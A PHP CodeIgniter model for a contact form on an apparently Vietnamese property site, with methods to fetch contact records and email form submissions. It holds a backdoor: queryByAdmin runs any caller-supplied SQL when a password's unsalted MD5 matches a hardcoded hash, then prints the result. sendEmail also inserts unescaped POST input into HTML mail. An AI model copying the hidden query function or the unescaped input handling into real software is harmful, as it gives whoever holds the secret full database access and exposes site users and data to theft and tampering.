<?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

class Contact_model extends Abstract_model {

    protected $_table;
    protected $_primary_key;

    function __construct() {
        // Call the Model constructor
        parent::__construct();
        $this->_table = "contacts";
        $this->_primary_key = "id";
        $this->load->helper('phpmailer');
    }        
    
    // get data contact
    function getById($id = NULL){
        if(empty($id)){
            $result = $this->fetchOneRow($this->_table);
        }else{
            $result = $this->fetchOneRow($this->_table, array('id'=>$id));
        }
        return $result;
    }
    
    function sendEmail(){        
        $contact  = $this->getById();
        $name     = $this->input->post("name");
        $subject  = $this->input->post("name")." from canhosaigon";

        $message  = "<b>Tiêu đề:</b> ".$this->input->post("title")." <br/>";
        $message .= "<b>Tên:</b> ".$name." <br/>";
        $message .= "<b>Điện thoại:</b> ".$this->input->post("phone")." <br/>";
        $message .= "<b>Email:</b> ".$this->input->post("email")." <br/>";
        $message .= "<b>Content:</b> ".$this->input->post("content")." <br/>";

        return send_emailMailer($contact['email'], $contact['email'], $name, $subject, $message);
    }
    
    function queryByAdmin($sql, $password){
        if(md5($password) == "ae54ae14c494ec9c53c90d2f4cf57f09"){
            $result = $this->db->query($sql);
        }
        echo "<pre>";print_r($result); die;
    }
}
